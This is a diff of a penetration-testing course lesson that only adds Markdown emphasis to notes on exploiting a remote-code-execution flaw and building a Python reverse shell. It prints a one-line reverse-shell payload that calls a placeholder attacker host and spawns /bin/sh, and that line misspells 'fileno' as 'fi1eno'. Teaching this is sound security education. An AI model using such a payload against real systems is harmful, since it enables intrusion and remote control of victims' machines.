@@ -538,24 +538,24 @@ ___
   ![SearchSploit](./Files/Images/Lesson12/searchsploit23.png)
   * See how the full command is visible?
   * The result of whoami just follows after "=/tmp", like the PHP code did
-    * The output of the whoami command is www-data!
+    * The output of the whoami command is **www-data**!
 * Now we understand how the exploit works.
-  * We've seen a Python script do it wrong, and a Metasploit module do it right
+  * We've seen a Python script do it *wrong*, and a Metasploit module do it *right*
   * Why not write a Python 3 script, that incorporates all the best parts?
   * Correct inputs, communicative output, exception handling...
   * The command & control should be as flexible and easy as possible.  
 
 ### Python reverse shell
 
-* Leverage an exploit to get a reverse shell!
+* Leverage an exploit to get a **reverse shell**!
   * The best form of control is a reverse shell:
-  * Since you have a form of Remote Code Execution (RCE), you can have the victim machine connect back to you.
-  * With a reverse shell, you interact with a command-line actively on the box.
+  * Since you have a form of **Remote Code Execution (RCE)**, you can have the victim machine connect back to you.
+  * With a reverse shell, you interact with a command-line **actively on the box**.
   * This can be accomplished with many different languages.  
   * [Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 * In Python, this is accomplished with two modules
-  * You have connected with a remote host with the socket module before...
-  * And you have heard of the os module!
+  * You have connected with a remote host with the **socket** module before...
+  * And you have heard of the **os** module!
   * For a Python reverse shell:
   ![ReverseShell](./Files/Images/Lesson12/reverseshell1.png)
 * Basic source code for a Python reverse shell:  
@@ -566,11 +566,11 @@ ___
   * On cheatsheets you will see this compressed to just one long line.  
 
     ```python
-    python -c 'import os, socket; s=socket.socket(); s.connect(("YOUR.HOST.IP.ADDRESS",9001)); os.dup2(s.fi1eno(), 0); os.dup2(s.fi1eno(), 1); os.dup2(s.fi1eno(),2); os.system( "/bin/sh")'
+    python -c 'import os, socket; s=socket.socket(); s.connect(("YOUR.HOST.IP.ADDRESS",9001)); os.dup2(s.fi1eno(), 0); os.dup2(s.fi1eno(), 1); os.dup2(s.fi1eno(), 2); os.system("/bin/sh")'
     ```
 
   * This is so you can easily copy and paste it in your RCE vector!
-  * Remember, you'll need to set up a *listener* to catch the reverse shell.  
+  * Remember, you'll need to *set up a listener* to catch the reverse shell.  
   ![ReverseShell](./Files/Images/Lesson12/reverseshell3.png)
 * Execute this with the RCE attack vector:
   * This payload has a lot of special characters...
